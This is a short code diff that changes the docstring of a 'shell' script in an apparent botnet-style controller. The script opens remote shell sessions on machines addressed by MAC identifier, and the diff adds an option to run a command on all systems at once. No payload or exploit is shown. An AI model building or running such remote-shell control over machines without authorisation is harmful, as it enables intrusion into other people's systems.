@@ -10,14 +10,16 @@ from .. import BotNet, Request
 @BotNet.default_script(script_version="0.0.1")
 def shell(request: Request, *cmd_args) -> str:
     """
-    `[mac-address] shell` -> shell session
+    `[mac-address] /shell` -> shell session
     or 
-    `[mac-address] shell [command]`-> run command and exit
+    `[mac-address] /shell [command]`-> run command and exit
 
     example input command:
-         `94945035671481 shell`  \n 
-         `94945035671481 shell ls .`\n
-         `94945035671481 shell ping google.com -c 10`
+         `94945035671481 /shell`  \n 
+         `94945035671481 /shell ls .`\n
+         `94945035671481 /shell ping google.com -c 10`
+        or
+         `/shell ping google.com -c 10` -> run command in all systems
 """
     engine = request.engine
 
